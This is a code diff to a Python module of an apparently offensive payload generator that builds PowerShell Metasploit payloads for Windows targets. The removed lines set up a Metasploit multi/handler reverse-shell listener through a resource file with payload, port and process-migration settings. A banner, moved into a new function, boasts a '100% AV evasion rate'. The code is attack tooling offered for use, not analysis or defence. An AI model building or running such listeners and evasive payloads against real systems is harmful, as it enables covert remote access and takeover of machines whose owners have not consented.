@@ -13,32 +13,14 @@ from src.core import menus
 
 iface = iface_ip()
 
-def start_rev_listener():
-	PrintInfo("Starting multi handler")
-
-	# create rc file
-	rcfile = "/tmp/ps_listener.rc"
-	fw = open(rcfile, "w")
-	fw.write("use exploit/multi/handler\n")
-	fw.write("set PAYLOAD %s\n" % payload)
-	fw.write("set LHOST 0.0.0.0\n")
-	fw.write("set LPORT %s\n" % port)
-	
-	# for meterpreter payloads
-	if not selection or selection in ('1','2'):
-		fw.write("set ExitOnSession false\n")
-		fw.write("set AutoRunScript migrate -f\n")
-
-	fw.write("exploit -j -z")
-	fw.close()
-
-	# start listener
-	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
-
-	PrintInfo("Cleaning up...")
-	os.remove(rcfile)
-	os.remove(payloadfile)
-	time.sleep(1)
+def moduleInfo():
+	print colours.bold + colours.green + \
+"""#################################################################
+# This powershell module currently has a 100% AV evasion rate.  #
+#                                                               #
+# Compatible with XP, 2k3, 7 & 2k8.                             #
+# The payload requires the target to have powershell installed. #
+#################################################################""" + colours.reset
 
 def generate_payload(payload,ipaddr,port):
 	# grab the metasploit path
@@ -98,13 +80,7 @@ def generate_payload(payload,ipaddr,port):
 while 1:
 	try:
 		clear()
-		print colours.bold + colours.green + \
-"""#################################################################
-# This powershell module currently has a 100% AV evasion rate.  #
-#                                                               #
-# Compatible with XP, 2k3, 7 & 2k8.                             #
-# The payload requires the target to have powershell installed. #
-#################################################################""" + colours.reset
+		moduleInfo()
 		
 		menus.powershell_menu()
 		selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
@@ -139,25 +115,6 @@ while 1:
 		fw.close()
 		time.sleep(2)
 
-		listener = raw_input("\nStart MSF listener (Y/N):")
-		if listener == 'Y' or listener == 'y' or listener == '':
-			start_rev_listener()
-		else:
-			try:
-				import pynotify1
-				import pygtk
-				pygtk.require('2.0')
-				if not pynotify.init("PayGen"):
-					pass
-				
-				n = pynotify.Notification("Finished", "Powershell payload generated in %s" % payloadfile)
-		
-				if not n.show():
-					PrintInfo("Notifcation failed")
-					pass
-			except:
-				pass
-		
 		# Return to main
 		EntContinue()
 		break
